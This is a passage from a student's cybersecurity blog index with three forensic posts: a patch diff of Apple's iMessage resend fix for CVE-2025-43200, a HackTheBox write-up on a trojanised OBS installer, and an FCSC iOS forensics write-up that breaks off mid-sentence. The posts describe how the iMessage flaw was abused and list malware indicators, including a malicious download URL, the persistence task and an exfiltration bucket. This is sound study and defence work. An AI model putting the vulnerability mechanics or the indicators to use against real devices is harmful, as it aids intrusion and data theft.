




[{"content":"","date":"8 July 2025","externalUrl":null,"permalink":"/blog-cyber/en/tags/graphite/","section":"Tags","summary":"","title":"Graphite","type":"tags"},{"content":" ⚠️ Disclaimer:\nI’m a cybersecurity student, this is a non-professional, personal blog post. My analysis may contain errors or oversights I\u0026rsquo;m still learning. If you spot any mistakes or have suggestions, please don’t hesitate to reach out!\n1. Citizen Lab breaks the story #\rOn 12 June 2025, Citizen Lab published \u0026quot;First Forensic Confirmation of Paragon\u0026rsquo;s iOS Mercenary Spyware\u0026quot;.\nTheir report links Paragon\u0026rsquo;s Graphite spyware to a zero-click iMessage payload observed on several European journalists\u0026rsquo; and NGO phones.\nCore facts:\nInfection hit fully-patched iPhones in April 2025. Delivery vector: a malicious photo / video sent via an iCloud Link in Messages. On success, Graphite gained file-system access and exfiltrated iMessage, Signal and WhatsApp data. Citizen Lab\u0026rsquo;s timeline ends on 11 June 2025 UTC, when Apple ships iOS 18.3.1 and credits CVE-2025-43200 as the fix.\n2. CVE-2025-43200 \u0026amp; Apple\u0026rsquo;s one-liner advisory #\rIn Apple\u0026rsquo;s security note for iOS 18.3.1 we can read:\nImpact: A logic issue existed when processing a maliciously crafted photo or video shared via an iCloud Link. Apple is aware of a report that this issue may have been exploited in an extremely sophisticated attack against specific targeted individuals. Description: This issue was addressed with improved checks.\nCVE-2025-43200 – Apple.\nNo file paths, no clue which binary changed. That\u0026rsquo;s where patch diffing comes in!\n3. Checking blacktop/ipsw-diffs on 18.3 (22D63) vs 18.3.1 (22D72) #\rBlacktop\u0026rsquo;s automated diff shows 10 Mach-Os rebuilt in the hot-fix, but only three are in the Messages stack highlighted below:\niMessage (System/Library/Messages/PlugIns/iMessage.imservice/iMessage) SafetyMonitor (System/Library/Messages/iMessageApps/SafetyMonitorMessages.bundle/SafetyMonitorMessages) identityservicesd (System/Library/PrivateFrameworks/IDS.framework/identityservicesd.app/identityservicesd) Binary Why we picked it High-level diff result iMessage.imservice Core plug-in that implements iMessage logic, network deserialization \u0026amp; resend helpers Significant: new log string + new early-return guard SafetyMonitorMessages Swift bundle that shows Communication-Safety pop-ups no functional delta seen with diffing tool identityservicesd IDS/Push daemon that hands traffic to Messages no functional delta seen with diffing tool 4. Getting inside 18.3 (22D63) and 18.3.1 (22D72) #\rAs iOS 18, Apple added dmg.aea which make the diffing different than before, if like me you were used to basic dmg! That\u0026rsquo;s why I will provide a micro-guide for this. If you\u0026rsquo;re only interested in the technical analysis you can skip to: write\nDownload the two iOS versions ipsw download ipsw --device iPhone17,1 --build 22D63 ipsw download ipsw --device iPhone17,1 --build 22D72 Extract filesystem ipsw extract --dmg fs iPhone17,1_18.3_22D63_Restore.ipsw ipsw extract --dmg fs iPhone17,1_18.3.1_22D72_Restore.ipsw Extract fcs-key and the dmg ipsw extract --fcs-key iPhone17,1_18.3_22D63_Restore.ipsw ipsw fw aea --pem \u0026#39;044-59182-075.dmg.aea.pem\u0026#39; \u0026#39;044-59515-074.dmg.aea\u0026#39; --output extracted/ # do this for the other one too Mount ipsw mount fs --pem-db extracted/fcs-keys.json ../iPhone17,1_18.3_22D63_Restore.ipsw If like me this doesn\u0026rsquo;t work for any reasons:\nsudo apfs-fuse -o allow_other,uid=1001,gid=1001 extracted/044-59515-074.dmg /mnt/ios_old Copy needed files cp System/Library/PrivateFrameworks/IDS.framework/identityservicesd.app/identityservicesd ~/Documents/CVE-2025-43200/18.3.1/ cp System/Library/Messages/PlugIns/iMessage.imservice/iMessage ~/Documents/CVE-2025-43200/18.3.1/ cp System/Library/Messages/iMessageApps/SafetyMonitorMessages.bundle/SafetyMonitorMessages ~/Documents/CVE-2025-43200/18.3.1/ 5. Diffs inside iMessage.imservice 18.3 (22D63) and 18.3.1 (22D72) #\rFirst of all here\u0026rsquo;s the similarity:\nradiff2 -s 18.3/iMessage 18.3.1/iMessage similarity: 0.977 distance: 49654 Then we can dig deeper in the diff with IDA Pro and Diaphora script:\nWe can see a partial match for -[MessageServiceSession _reAttemptMessageDeliveryForGUID: …]\nWith a notable new log \u0026quot;Being requested to re-send a message that wasn't sent by me\u0026quot;\nUsing Graph view we can clearly see the new checking:\nHere\u0026rsquo;s the 2 important changes:\nNew authorship gate that stops the reflection primitive: // AFTER 18.3.1 - NEW blocks resend of foreign messages if (![message isFromMe]) { // message authored by someone else os_log_info(MessageServiceLog, \u0026#34;Being requested to re-send a message that wasn\u0026#39;t sent by me\u0026#34;); return; // bail = exploit dies } Why? - Paragon\u0026rsquo;s zero-click chain forged a \u0026ldquo;resend\u0026rdquo; control frame that pointed to a GUID in the victim\u0026rsquo;s chat DB (where is_from_me == 0). The single guard above rejects that request, cutting the data-exfil path.\nYou can see this here in the SMS.db:\nAge-limit test pulled forward, no retries for stale messages // BEFORE 18.3 - only skipped retries if the msg was still fresh (logic inverted) if (timeSinceDelivered \u0026lt;= [self _messageRetryTimeout]) { // !v37 … proceed toward retry … } // AFTER 18.3.1 – bail out immediately when message is too old if (timeSinceDelivered \u0026gt; [self _messageRetryTimeout]) { // v37 os_log_info(MessageServiceLog, \u0026#34;Message %@ originally delivered at %@ is too old to retry.\u0026#34;, guid, deliveredDate); return; // no resend } Why? - Apple tightened the resend window so attackers can\u0026rsquo;t keep hammering the same GUID months later.\nPutting the pieces together:\nAuthor check closes the core logic bug exploited by CVE-2025-43200. Tighter age check reduces the replay window (defence-in-depth). CVE-2025-43200 is a one-line logic patch:\n\u0026ldquo;Only retry messages you actually wrote.\u0026rdquo;\nThe exploit succeeded because that obvious invariant was never enforced in the resend helper. Apple\u0026rsquo;s fix consists of:\nif (!msg.isFromMe) return; An os_log statement for triage. 18.3 (vulnerable) 18.3.1 (patched) ┌───────────────────┐ ┌────────────────────────────────┐ │ … look-ups … │ │ … same … │ │ age-limit check │ │ age-limit check (unchanged) │ │ ──────────────────│ │────────────────────────────────│ │ NO author check │ │ if (!message.isFromMe) { │ ◄─ NEW │ retry logic │ │ log \u0026#34;...not sent by me...\u0026#34; | └───────────────────┘ │ return; │ │ } │ │ retry logic (unchanged) │ └────────────────────────────────┘ 6. How this maps to CVE-2025-43200 #\rCitizen Lab reports that PARAGON\u0026rsquo;s zero-click chain used iCloud-link messages to coerce the target device into reflecting or auto-forwarding content it had previously received, part of the spyware\u0026rsquo;s exfiltration stage.\nThe attacker:\nInjected or replayed a specially-crafted iMessage \u0026ldquo;resend\u0026rdquo; request that points to an existing GUID in the victim\u0026rsquo;s local SQLite chat DB. Because 18.3 lacked the isFromMe test, the helper method _reAttemptMessageDeliveryForGUID:… happily burned a retry credit and re-sent the foreign message (or its attachment) to the attacker-controlled handle. Patch 18.3.1 closes that hole by insisting the GUID\u0026rsquo;s isFromMe bit is true. The message must originate from the local user. Any forged request that references someone-else\u0026rsquo;s message now trips the new log entry and bails early.\n7. Attack vector - a plausible reconstruction #\rSo far I haven\u0026rsquo;t found a compelling, end-to-end scenario that shows how CVE-2025-43200 fits into the cases documented by Citizen Lab. If you have alternative ideas-or artefacts I\u0026rsquo;ve missed—please get in touch; I\u0026rsquo;d be keen to investigate further.\nMy first hypothesis was that the bug might provide a stealthy exfiltration channel. On closer inspection that seems unlikely: the resend primitive can forward only those attachments that already live inside the Messages sandbox. It would not, by itself, let an attacker pull arbitrary data such as Signal or WhatsApp databases.\n8. Forensic thoughts #\rSince I don\u0026rsquo;t have the CitizenLab compromised iPhones everything here is hypothesis or purely logical deductions.\n1. Unified log queries that surface CVE-2025-43200 activity:\nWhat to look for Why it matters \u0026quot;re-send a message that wasn't sent by me\u0026quot; New os_log string introduced only in iOS 18.3.1+; its presence means the device blocked a forged resend attempt. _reAttemptMessageDeliveryForGUID stack traces (pre-patch) On vulnerable 18.3/18.2.1 devices you may still see crash or fault logs that name this selector if the exploit mis-fires. Tip: unified logs roll after ~7 days on-device; always pull a full sysdiagnose immediately.\n2. Chat database (sms.db) artefacts:\n/* Possible reflection duplicates: same GUID appears as both inbound (is_from_me = 0) and outbound (is_from_me = 1) within a short window */ SELECT guid, date, is_from_me, text FROM message WHERE guid IN ( SELECT guid FROM message WHERE is_from_me = 0 ) ORDER BY date ASC; A duplicate GUID flipping from is_from_me = 0 ➜ 1 without user action strongly suggests the resend primitive was abused. Cross-reference the GUID with the attachments table; Paragon\u0026rsquo;s chain replayed iCloud-link photo/video blobs. 3. IDS \u0026amp; Message-delivery traces:\nLocation (rooted dump or iOS Full Filesystem): /private/var/mobile/Library/Logs/CrashReporter/DiagnosticLogs/ids.* Grep for: \u0026quot;resend-request\u0026quot; \u0026quot;guid\u0026quot; values that also appear in sms.db duplicates \u0026quot;handleID\u0026quot; matching unknown email/phone numbers These plaintext IDS control-frames often survive in the diagnostic logs even when the main unified log has rolled.\n","date":"8 July 2025","externalUrl":null,"permalink":"/blog-cyber/en/posts/graphite-caught/","section":"Posts","summary":"⚠️ Disclaimer:","title":"Graphite Caught Paragon's zero-click iMessage bug and how Apple quietly patched it","type":"posts"},{"content":"","date":"8 July 2025","externalUrl":null,"permalink":"/blog-cyber/en/tags/ios/","section":"Tags","summary":"","title":"IOS","type":"tags"},{"content":"","date":"8 July 2025","externalUrl":null,"permalink":"/blog-cyber/en/","section":"Jaybird1291","summary":"","title":"Jaybird1291","type":"page"},{"content":"","date":"8 July 2025","externalUrl":null,"permalink":"/blog-cyber/en/tags/paragon/","section":"Tags","summary":"","title":"Paragon","type":"tags"},{"content":"","date":"8 July 2025","externalUrl":null,"permalink":"/blog-cyber/en/tags/patch-diffing/","section":"Tags","summary":"","title":"Patch-Diffing","type":"tags"},{"content":"","date":"8 July 2025","externalUrl":null,"permalink":"/blog-cyber/en/posts/","section":"Posts","summary":"","title":"Posts","type":"posts"},{"content":"","date":"8 July 2025","externalUrl":null,"permalink":"/blog-cyber/en/tags/","section":"Tags","summary":"","title":"Tags","type":"tags"},{"content":"","date":"1 June 2025","externalUrl":null,"permalink":"/blog-cyber/en/tags/hackthebox/","section":"Tags","summary":"","title":"HackTheBox","type":"tags"},{"content":"","date":"1 June 2025","externalUrl":null,"permalink":"/blog-cyber/en/tags/hard/","section":"Tags","summary":"","title":"Hard","type":"tags"},{"content":"","date":"1 June 2025","externalUrl":null,"permalink":"/blog-cyber/en/tags/sherlock/","section":"Tags","summary":"","title":"Sherlock","type":"tags"},{"content":"\rScenario #\rSimon Stark is a dev at forela who recently planned to stream some coding sessions with colleagues on which he received appreciation from CEO and other colleagues too. He unknowingly installed a well known streaming software which he found by google search and was one of the top URL being promoted by google ads. Unfortunately things took a wrong turn and a security incident took place. Analyze the triaged artifacts provided to find out what happened exactly.\nAttack-Flow Diagram – Overview #\r(Skip this if you don’t want spoilers.)\nSetup #\rFor this Sherlock we’ll use :\nEric Zimmerman\u0026rsquo;s Tools (Registry Explorer, EvtxECmd, MFTECmd TimeLine Explorer, PECmd\u0026hellip;) HxD Hex Editor strings We\u0026rsquo;ll also use those cheat sheets:\nhttps://cdn.13cubed.com/downloads/windows_event_log_cheat_sheet.pdf https://cdn.13cubed.com/downloads/windows_registry_cheat_sheet.pdf https://cdn.13cubed.com/downloads/anatomy_of_an_ntfs_file_record.pdf Question 1 #\rWhat\u0026rsquo;s the original name of the malicious zip file which the user downloaded thinking it was a legit copy of the software?\nThe answer lives in the user hive NTUSER.DAT: the key RecentDocs lists files recently opened by the user.\nAnswer : OBS-Studio-28.1.2-Full-Installer-x64.zip\nQuestion 2 #\rSimon Stark renamed the downloaded zip file to something else. What\u0026rsquo;s the renamed Name of the file alongside the full path?\nTo answer this question, we first need to understand that any renaming operation under NTFS (the Windows filesystem) generates a modification of the $FILE_NAME (attribute 0x30) in the MFT.\nWe therefore use MFTECmd to parse the $MFT:\nMFTECmd.exe -f \u0026#34;C:\\$MFT\u0026#34; --csv \u0026#34;C:\\Temp\\Out\u0026#34; Then import it into Timeline Explorer:\nAnswer : C:\\Users\\Simon.stark\\Documents\\Streaming Software\\Obs Streaming Software.zip\nQuestion 3 #\rWhat\u0026rsquo;s the timestamp when the file was renamed?\nStill in the same place:\nAnswer : 2023-05-05 10:22:23\nQuestion 4 #\rWhat\u0026rsquo;s the Full URL from where the software was downloaded?\nStill in the same place:\nDownloading a file under Windows (via a browser like Edge or Internet Explorer) automatically creates an auxiliary data stream on the NTFS called Zone.Identifier.\nThis ADS (\u0026ldquo;Alternate Data Stream\u0026rdquo;) is stored with the file itself and contains, in particular:\nZoneId : the security zon (3 = internet) ReferrerUrl : the URL of the page that launched the download HostUrl : the exact URL of the downloaded file Answer : http://obsproicet.net/download/v28_23/OBS-Studio-28.1.2-Full-Installer-x64.zip\nQuestion 5 #\rDig down deeper and find the IP Address on which the malicious domain was being hosted.\nHere it\u0026rsquo;s very simple: we parse the event logs with EvtxECmd and look for the domain name:\nEvtxECmd.exe -d \u0026#39;C:\\Windows\\System32\\winevt\\Logs\\\u0026#39; --csv \u0026#39;C:\\Temp\\out\u0026#39; Answer : 13.232.96.186\nQuestion 6 #\rMultiple Source ports connected to communicate and download the malicious file from the malicious website. Answer the highest source port number from which the machine connected to the malicious website.\nOn Windows, if the firewall is configured to log connections, it will record each access attempt, not as a domain name, but as the target IP.\nThe pfirewall.log file (C:\\Windows\\System32\\LogFiles\\Firewall) records, for each packet examined:\ndate and time, action (e.g. \u0026ldquo;ALLOW\u0026rdquo; or \u0026ldquo;DROP\u0026rdquo;), protocol (TCP/UDP), source IP address, destination IP address, source and destination ports, etc. Here there are only 6 connections to this IP, so don\u0026rsquo;t bother, you can find it manually in 5 seconds:\nAnswer : 50045\nQuestion 7 #\rThe zip file had a malicious setup file in it which would install a piece of malware and a legit instance of OBS studio software so the user has no idea they got compromised. Find the hash of the setup file.\nTo answer this question, let\u0026rsquo;s take a look at the Amcache hive. It registers all executables as they are launched, installed, copied, etc. For each application, it stores several metadata: full path, date of appearance, and in particular the hash SHA1 of the binary.\nIn concrete terms, when the user has extracted the zip and the malicious setup has been executed (or even simply opened), Windows has added an entry in the:\nHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\AppModel\\InventoryApplicationFile (corresponding to Amcache\\InventoryApplicationFile in the Amcache.hve hive)\nIf we\u0026rsquo;d had a complete copy of the disk, we could have calculated the hash on the fly to go faster. However, this is a bad idea.\nUnlike the simple hash calculated on the fly, Amcache records the SHA1 from the first execution or extraction in the local system, regardless of any subsequent modification (unless the Amcache entry is explicitly edited/deleted).\nEven if the user has deleted the zip or renamed the setup, Amcache retains this old trace until the file is reinstalled or the entry is cleaned up.\nAnswer : 35e3582a9ed14f8a4bb81fd6aca3f0009c78a3a1\nQuestion 8 #\rThe malicious software automatically installed a backdoor on the victim\u0026rsquo;s workstation. What\u0026rsquo;s the name and filepath of the backdoor?\nLet\u0026rsquo;s go back to the $MFT as it records every file creation and execution.\nTo proceed, I\u0026rsquo;ve simply looked for a temporal link with the execution of the malicious setup:\nI knew that at time T0 (2023-05-05 10:23:14), the user had launched the malicious setup. a few seconds later (T0 + a few seconds), a new entry appeared in the timeline: C:\\Program Files\\Miloyeki ker konoyogi\\lat takewode libigax weloj jihi quimodo datex dob cijoyi mawiropo.exe. as it didn\u0026rsquo;t exist before (no previous entry in the $MFT for this path), we can deduce that this is the file created by the malicious setup. Answer : C:\\Users\\Simon.stark\\Miloyeki ker konoyogi\\lat takewode libigax weloj jihi quimodo datex dob cijoyi mawiropo.exe\nQuestion 9 #\rFind the prefetch hash of the backdoor.\nWhen you run a program under Windows, the system saves a .pf (prefetch) file in C:\\Windows\\Prefetch whose name combines:\nThe executable name (LAT TAKEWODE....exe) A hash calculated from its full path on disk This hash is not random; Windows generates it to distinguish several instances of the same executable if they reside in different paths.\n.\\PECmd.exe -d \u0026#39;C:\\Windows\\prefetch\u0026#39; --csv \u0026#39;C:\\Temp\\Out\u0026#39; Answer : D8A6D943\nQuestion 10 #\rThe backdoor is also used as a persistence mechanism in a stealthy manner to blend in the environment. What\u0026rsquo;s the name used for persistence mechanism to make it look legit?\nThe most commonly used persistence mechanisms are:\nRun / RunOnce registry keys Windows service Scheduled tasks Startup folder, etc. Here, it relies on the creation of a scheduled task whose name mimics a COMSurrogate system process. When Windows creates or modifies a scheduled task, an event ID 4698 (\u0026ldquo;A scheduled task was created\u0026rdquo;) is recorded in the security log (Security.evtx).\n.\\EvtxECmd.exe -d \u0026#39;C:\\Windows\\System32\\winevt\\Logs\\\u0026#39; --csv \u0026#39;C:\\Temp\\Out\\\u0026#39; \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-16\u0026#34;?\u0026gt; \u0026lt;Task version=\u0026#34;1.2\u0026#34; xmlns=\u0026#34;http://schemas.microsoft.com/windows/2004/02/mit/task\u0026#34;\u0026gt; \u0026lt;RegistrationInfo\u0026gt; \u0026lt;Date\u0026gt;2023-05-05T15:23:21\u0026lt;/Date\u0026gt; \u0026lt;Author\u0026gt;FORELA\\simon.stark\u0026lt;/Author\u0026gt; \u0026lt;URI\u0026gt;\\COMSurrogate\u0026lt;/URI\u0026gt; \u0026lt;/RegistrationInfo\u0026gt; \u0026lt;Triggers\u0026gt; \u0026lt;LogonTrigger\u0026gt; \u0026lt;StartBoundary\u0026gt;2023-05-05T15:23:00\u0026lt;/StartBoundary\u0026gt; \u0026lt;Enabled\u0026gt;true\u0026lt;/Enabled\u0026gt; \u0026lt;/LogonTrigger\u0026gt; \u0026lt;/Triggers\u0026gt; \u0026lt;Principals\u0026gt; \u0026lt;Principal id=\u0026#34;Author\u0026#34;\u0026gt; \u0026lt;RunLevel\u0026gt;HighestAvailable\u0026lt;/RunLevel\u0026gt; \u0026lt;UserId\u0026gt;FORELA\\simon.stark\u0026lt;/UserId\u0026gt; \u0026lt;LogonType\u0026gt;InteractiveToken\u0026lt;/LogonType\u0026gt; \u0026lt;/Principal\u0026gt; \u0026lt;/Principals\u0026gt; \u0026lt;Settings\u0026gt; \u0026lt;MultipleInstancesPolicy\u0026gt;IgnoreNew\u0026lt;/MultipleInstancesPolicy\u0026gt; \u0026lt;DisallowStartIfOnBatteries\u0026gt;true\u0026lt;/DisallowStartIfOnBatteries\u0026gt; \u0026lt;StopIfGoingOnBatteries\u0026gt;true\u0026lt;/StopIfGoingOnBatteries\u0026gt; \u0026lt;AllowHardTerminate\u0026gt;true\u0026lt;/AllowHardTerminate\u0026gt; \u0026lt;StartWhenAvailable\u0026gt;false\u0026lt;/StartWhenAvailable\u0026gt; \u0026lt;RunOnlyIfNetworkAvailable\u0026gt;false\u0026lt;/RunOnlyIfNetworkAvailable\u0026gt; \u0026lt;IdleSettings\u0026gt; \u0026lt;Duration\u0026gt;PT10M\u0026lt;/Duration\u0026gt; \u0026lt;WaitTimeout\u0026gt;PT1H\u0026lt;/WaitTimeout\u0026gt; \u0026lt;StopOnIdleEnd\u0026gt;true\u0026lt;/StopOnIdleEnd\u0026gt; \u0026lt;RestartOnIdle\u0026gt;false\u0026lt;/RestartOnIdle\u0026gt; \u0026lt;/IdleSettings\u0026gt; \u0026lt;AllowStartOnDemand\u0026gt;true\u0026lt;/AllowStartOnDemand\u0026gt; \u0026lt;Enabled\u0026gt;true\u0026lt;/Enabled\u0026gt; \u0026lt;Hidden\u0026gt;false\u0026lt;/Hidden\u0026gt; \u0026lt;RunOnlyIfIdle\u0026gt;false\u0026lt;/RunOnlyIfIdle\u0026gt; \u0026lt;WakeToRun\u0026gt;false\u0026lt;/WakeToRun\u0026gt; \u0026lt;ExecutionTimeLimit\u0026gt;PT72H\u0026lt;/ExecutionTimeLimit\u0026gt; \u0026lt;Priority\u0026gt;7\u0026lt;/Priority\u0026gt; \u0026lt;/Settings\u0026gt; \u0026lt;Actions Context=\u0026#34;Author\u0026#34;\u0026gt; \u0026lt;Exec\u0026gt; \u0026lt;Command\u0026gt;C:\\Users\\Simon.stark\\Miloyeki\u0026lt;/Command\u0026gt; \u0026lt;Arguments\u0026gt;ker konoyogi\\lat takewode libigax weloj jihi quimodo datex dob cijoyi mawiropo.exe\u0026lt;/Arguments\u0026gt; \u0026lt;/Exec\u0026gt; \u0026lt;/Actions\u0026gt; \u0026lt;/Task\u0026gt; Answer : COMSurrogate\nQuestion 11 #\rWhat\u0026rsquo;s the bogus/invalid randomly named domain which the malware tried to reach?\nSince the scheduled task was created at 10:23:21, we position ourselves around this time in the Microsoft-Windows-DNS-Client/Operational channel to locate the \u0026ldquo;invalid\u0026rdquo; domain that the malware tried to resolve.\nAnswer : oaueeewy3pdy31g3kpqorpc4e.qopgwwytep\nQuestion 12 #\rThe malware tried exfiltrating the data to a s3 bucket. What\u0026rsquo;s the url of s3 bucket?\nSame but filtered with \u0026ldquo;s3\u0026rdquo;:\nAnswer : bbuseruploads.s3.amazonaws.com\nQuestion 13 #\rWhat topic was simon going to stream about in week 1? Find a note or something similar and recover its content to answer the question.\nThe user\u0026rsquo;s recent files contain a shortcut to the file \u0026ldquo;Week 1 plan.txt\u0026rdquo;. But there\u0026rsquo;s no trace of the file, as we don\u0026rsquo;t have a copy of the folder in question.\nSo we\u0026rsquo;re going to analyze the $MFT. As we have already seen, every file, even if it has been deleted or moved, has an entry in the MFT, and we will be able to find the resident data:\nNon-resident: for files of sufficient size, NTFS does not store their data directly in the MFT. The $DATA field then contains \u0026ldquo;runs\u0026rdquo; (blocks) which point to clusters on the disk where the actual contents are stored. Resident: when the file is very small (historically: less than 1 KB or of the order of a few hundred bytes, depending on Windows version and attribute size), its data is stored directly inside the MFT entry, in the $DATA block. This is known as resident data. ┌───────────────┬─────────────────────────────────┬─────────────────────┐ │ MFT Header │ Attribut #0 (STANDARD_INFO) │ ... │ │ (48 bytes…) ├─────────────────────────────────┤ │ │ │ Attribut #1 (FILE_NAME)│ │ │ │ ├─────────────────────────────────┤ │ │ │ Attribut #2 (DATA, resident) │ \u0026lt;— │ │ │ │ │ │ └─────────────────────────────────┴─────────────────────┘ │\t...... │ └───────────────────────────────────────────────────────────────────────┘ cf. https://youtu.be/B4b6Ocf3wYs?si=rUruujZiEIdjgFKD\nAnswer : Filesystem Security\nQuestion 14 #\rWhat\u0026rsquo;s the name of Security Analyst who triaged the infected workstation?\nA little bit of \u0026ldquo;guess\u0026rdquo; because this question is not interesting. If you\u0026rsquo;ve done a lot of Sherlock, you\u0026rsquo;re starting to get the hang of this CyberJunkie.\nAnswer : CyberJunkie\nQuestion 15 #\rWhat\u0026rsquo;s the network path from where acquisition tools were run?\nFirst, we need to find the tool used. There are several ways of doing this:\ncheck the LNK \u0026amp; Jump Lists files Event ID 4688 (A new process has been created) AmCache (InventoryApplicationFile) $MFT as described above Prefetch files For the sake of speed, I decided to use the prefetch files. Logically, the acquisition tool was launched as recently as possible:\nBut no path.\nSo I check in :\nAppCompatCache: RAS Event ID 4688: RAS $MFT: RAS I\u0026rsquo;ll look for NTUSER.DAT but RAS too\u0026hellip; Nevertheless, we can see that we have ntuser.dat.LOG1 and LOG2.\nThese are transaction logs associated with the user registry hive (NTUSER.DAT).\nEvery modification made to the registry keys and values (for example, when a network path is added to an MRU or a UserAssist key) is first written to this log before being integrated (\u0026ldquo;committed\u0026rdquo;) into NTUSER.DAT itself. In concrete terms:\nthis is the transactional log of the user hive: every time an application or Windows writes something to HKCU (RunMRU, UserAssist, RecentDocs, etc.), the modification is first logged in NTUSER.DAT.LOG1 (and LOG2), then merged into NTUSER.DAT at a checkpoint if the session is abruptly closed or no checkpoint has yet taken place, NTUSER.DAT.LOG1 may contain entries that do not yet appear in NTUSER.DAT So I run a string search and bingo:\nAnswer : \\\\DESKTOP-887GK2L\\Users\\CyberJunkie\\Desktop\\Forela-Triage-Workstation\\Acquisiton and Triage tools\nIOC Table #\rCategory Field / Type Indicator Value Source / Note Hash (to add) Files (origin) Original ZIP OBS-Studio-28.1.2-Full-Installer-x64.zip NTUSER.DAT → RecentDocs (file missing) Malicious setup OBS Studio 28.1.2 Full Installer x64.exe Amcache InventoryApplicationFile SHA-1 = 35e3582a9ed14f8a4bb81fd6aca3f0009c78a3a1 Backdoor EXE C:\\Users\\Simon.stark\\Miloyeki ker konoyogi\\lat takewode libigax weloj jihi quimodo datex dob cijoyi mawiropo.exe $MFT (file missing) Network Download domain obsproicet.net Zone.Identifier ADS — Exact URL http://obsproicet.net/download/v28_23/OBS-Studio-28.1.2-Full-Installer-x64.zip Zone.Identifier ADS — Hosting IP 13.232.96.186 pfirewall.log — Highest source port 50045 pfirewall.log — Bogus domain oaueeewy3pdy31g3kpqorpc4e.qopgwwytep DNS-Client Operational — S3 exfil bucket bbuseruploads.s3.amazonaws.com DNS-Client Operational — Persistence Scheduled Task name \\COMSurrogate Security.evtx (4698) — Prefetch hash D8A6D943 Prefetch filename — Lab finished!\nhttps://labs.hackthebox.com/achievement/sherlock/1271052/899\n","date":"1 June 2025","externalUrl":null,"permalink":"/blog-cyber/en/posts/streamer/","section":"Posts","summary":"Scenario #\rSimon Stark is a dev at forela who recently planned to stream some coding sessions with colleagues on which he received appreciation from CEO and other colleagues too.","title":"Streamer","type":"posts"},{"content":"","date":"1 June 2025","externalUrl":null,"permalink":"/blog-cyber/en/tags/windows/","section":"Tags","summary":"","title":"Windows","type":"tags"},{"content":"","date":"1 June 2025","externalUrl":null,"permalink":"/blog-cyber/en/tags/writeup/","section":"Tags","summary":"","title":"Writeup","type":"tags"},{"content":"","date":"18 May 2025","externalUrl":null,"permalink":"/blog-cyber/en/tags/2025/","section":"Tags","summary":"","title":"2025","type":"tags"},{"content":"","date":"18 May 2025","externalUrl":null,"permalink":"/blog-cyber/en/tags/fcsc/","section":"Tags","summary":"","title":"FCSC","type":"tags"},{"content":"\rScenario #\rAs you pass through customs, the customs officer asks you to hand over your phone and its unlock code. The phone is returned to you a few hours later…\nSuspicious, you send your phone to ANSSI\u0026rsquo;s CERT-FR for analysis. CERT-FR analysts carry out a collection on the phone, consisting of a sysdiagnose and a backup.\niForensics - iDevice iForensics - iWiFi iForensics - iTreasure iForensics - iNvisible iForensics - iBackdoor 1/2 iForensics - iBackdoor 2/2 iForensics - iC2 iForensics - iCompromise\nWe have a logical backup.tar.xz (logical) plus a set of sysdiagnose and crash files!\nSetup #\rFor the whole series I relied on:\nDB Browser for SQLite EC-DIGIT-CSIRC/sysdiagnose iLEAPP Autopsy Handy reference material:\nSure, you could bring in heavier artillery (Plaso etc.), but I was solving the CTF late and opted for the fast route. 🤠\nIntro - iForensics - iCrash #\rIt seems that a flag has hidden itself in the place where crashes are stored on the phone…\nSuper-easy one. We know the crashes live in sysdiagnose_and_crashes.tar.xz, so:\ntar -xf sysdiagnose_and_crashes.tar.xz From here you can grep -r \u0026quot;FCSC{\u0026quot; or simply browse the crash folders by hand.\nIf we go inside sysdiagnose_and_crashes/private/var/mobile/Library/Logs/CrashReporter/ we\u0026rsquo;ll spot fcsc_intro.txt — and the flag.\nFlag : FCSC{7a1ca2d4f17d4e1aa8936f2e906f0be8}\n⭐ - iForensics - iDevice #\rTo start with, find some information of interest about the phone: iOS version and phone model identifier. The flag is in the format FCSC{|}. For example, for an iPhone 14 Pro Max running iOS 18.4 (22E240): FCSC{iPhone15,3|22E240}.\nTo answer this question, you need to know what an iOS backup consists of. I spoke earlier of a \u0026ldquo;logical\u0026rdquo; backup. This is important because if you look inside the backup, all you see are weird folders:\nTo make sense of it we must rebuild the real paths using Manifest.db (introduced with iOS 10). That DB maps each fileID to its original RelativePath.\nLuckily, some human-readable files survive at the root, including Info.plist. Apple stores key device metadata there:\nproduct Type (model identifier, e.g. iPhone12,3) product Version (iOS version, e.g. 16.0) build Version (e.g. 20A362) IMEI, serial, GUID, last-backup date, installed apps etc. Everything we need for the flag!\nFlag : FCSC{iPhone12,3|20A362}\nIf you\u0026rsquo;re interested in rebuilding the arbo, here\u0026rsquo;s a demonstration:\nFirst, let\u0026rsquo;s take a look at what Manifest.db is made of:\nPretty straightforward, so a tiny script can recreate the tree:\n#!/bin/bash BACKUP=\u0026#34;/mnt/hgfs/backup/backup\u0026#34; OUT=\u0026#34;/mnt/hgfs/backup/reconstructed-backup\u0026#34; mkdir -p \u0026#34;$OUT\u0026#34; sqlite3 -separator \u0026#39;|\u0026#39; \u0026#34;$BACKUP/Manifest.db\u0026#34; \\ \u0026#34;SELECT fileID, domain, COALESCE(relativePath,\u0026#39;\u0026#39;) FROM Files;\u0026#34; \\ | while IFS=\u0026#34;|\u0026#34; read -r FILEID DOMAIN RELPATH; do [[ -z \u0026#34;$RELPATH\u0026#34; ]] \u0026amp;\u0026amp; continue DEST_DIR=\u0026#34;$OUT/$DOMAIN/$(dirname \u0026#34;$RELPATH\u0026#34;)\u0026#34; DEST_PATH=\u0026#34;$OUT/$DOMAIN/$RELPATH\u0026#34; mkdir -p \u0026#34;$DEST_DIR\u0026#34; ln -s \u0026#34;$BACKUP/$FILEID\u0026#34; \u0026#34;$DEST_PATH\u0026#34; 2\u0026gt;/dev/null || true done And voilà !\n⭐ - iForensics - iWiFi #\rTo continue, find some information of interest about the phone: SSID and BSSID of the WiFi network the phone is connected to, as well as the iCloud account associated with the phone.\nThe flag is in the format FCSC{||}. For example, if the phone is connected to the example WiFi network, which has the BSSID 00:11:22:33:44:55 and the associated iCloud account is example@example.com: FCSC{example|00:11:22:33:44:55|example@example.com}.\nTo speed up the extraction of Wi-Fi and iCloud information, we can use iLEAPP (iOS Logs, Events, and Protobuf Parser): it will automatically collect and organize lots of artifacts for us and make a report.\nAfter running iLEAPP you can read SSID \u0026amp; BSSID straight from the Wi-Fi section:\nFor the iCloud account there are many angles possible; one of the easiest is to check which Apple ID installed the apps.\nFlag : FCSC{FCSC|66:20:95:6c:9b:37|robertswigert@icloud.com}\n⭐⭐ - iForensics - iTreasure #\rBefore the phone was handed over to customs, its owner had time to send a treasure. Find this treasure.\nThere are several quick avenues here. The wording hints at something sent, so my 